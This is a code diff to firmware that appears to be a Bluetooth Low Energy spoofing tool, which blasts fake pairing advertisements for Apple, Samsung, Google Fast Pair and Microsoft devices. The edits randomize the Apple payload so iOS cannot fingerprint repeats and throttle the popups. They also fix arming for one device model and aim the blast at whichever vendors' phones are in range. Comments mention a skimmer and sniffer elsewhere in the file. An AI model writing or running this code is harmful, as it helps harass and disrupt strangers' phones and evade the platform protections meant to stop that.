@@ -337,7 +337,17 @@ BLEAdvertisementData getAdvertismentData() {
   BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
 
   if (device_choice == 0) { // Apple
-    oAdvertisementData.addData(std::string((char*)DEVICES[device_index], 31));
+    // Entropy: real AirPods vary the trailing "encrypted payload" every advert;
+    // our templates froze it (0x45 12 12 12 00...), so iOS could fingerprint the
+    // repeat and throttle the popup even though we rotate the MAC. Copy the
+    // template and randomize the 16-byte hash region [15..30] per advert so each
+    // blast looks like a brand-new device. Header+model+status [0..14] untouched,
+    // so the popup still resolves to the right product. (Length byte 0x19 covers
+    // [6..30] and is unchanged.)
+    uint8_t appleBuf[31];
+    memcpy(appleBuf, DEVICES[device_index], 31);
+    for (int k = 15; k < 31; ++k) appleBuf[k] = (uint8_t)random(256);
+    oAdvertisementData.addData(std::string((char*)appleBuf, 31));
   } else if (device_choice == 1) { // Samsung
     uint8_t samsungIndex = device_index;
     generateSamsungAdvPacket(samsungIndex, oAdvertisementData);
@@ -663,6 +673,7 @@ void Beats_Studio_Pro() {
 void Betas_Fit_Pro() {
   device_choice = 0;
   device_index = 15;
+  attack_state = 1;   // was missing: without this the spoofer wouldn't arm on this model
 }
 
 void Beats_Studio_Buds_Plus() {
@@ -1089,8 +1100,11 @@ enum {
   TGT_MICROSOFT = 0x08
 };
 static const unsigned long BLAST_SCAN_PERIOD = 30000; // ms between target scans (Smart)
-static const unsigned long BLAST_SCAN_WINDOW = 2500;  // ms each scan lasts
-// Smart (true)  = scan what's in range every BLAST_SCAN_PERIOD and bias the blast.
+static const unsigned long BLAST_SCAN_WINDOW = 1200;  // ms each scan lasts (enough at a 60ms window)
+// Smart (true)  = scan what's in range every BLAST_SCAN_PERIOD and bias the blast
+//                 toward the vendors actually present (presence only, NOT by RSSI:
+//                 an RSSI gate would just lock onto the operator's own pocketed
+//                 phone and waste the +9 dBm range on nothing).
 // Dumb  (false) = original blind cycle through all 22 devices, no scanning.
 // Toggled live from the nav bar (BTN_LEFT / "Smart"-"Dumb" slot) in blastLoop.
 bool blastTargeting = true;
@@ -1118,10 +1132,9 @@ static String blastTargetLabel(uint8_t m) {
   return s;
 }
 
-// Scan callback: tag the vendor of every advertiser we hear. Apple/Samsung/
-// Microsoft are identified by their manufacturer company ID; Google Fast Pair by
-// its 0xFE2C service UUID. Same NimBLE 1.x callback shape as the rest of this
-// file (cf. the AdvCallbacks classes used by the skimmer/sniffer).
+// Scan callback: tag the vendor of every advertiser we hear, regardless of distance
+// (no RSSI gate). Apple/Samsung/Microsoft by manufacturer company ID; Google Fast
+// Pair by its 0xFE2C service UUID. Same NimBLE 1.x callback shape as the skimmer.
 class BlastTargetCallbacks : public BLEAdvertisedDeviceCallbacks {
   void onResult(BLEAdvertisedDevice* device) override {
     if (!device) return;
@@ -1136,9 +1149,6 @@ class BlastTargetCallbacks : public BLEAdvertisedDeviceCallbacks {
         else if (cid == 0x0006) m |= TGT_MICROSOFT;
       }
     }
-    // Fast Pair advertises service UUID 0xFE2C. Match on the string form, which
-    // getServiceUUID()/toString() already produce elsewhere in this file, so we
-    // don't depend on isAdvertisingService()/BLEUUID availability.
     if (device->haveServiceUUID()) {
       const std::string su = device->getServiceUUID().toString();
       if (su.find("fe2c") != std::string::npos ||
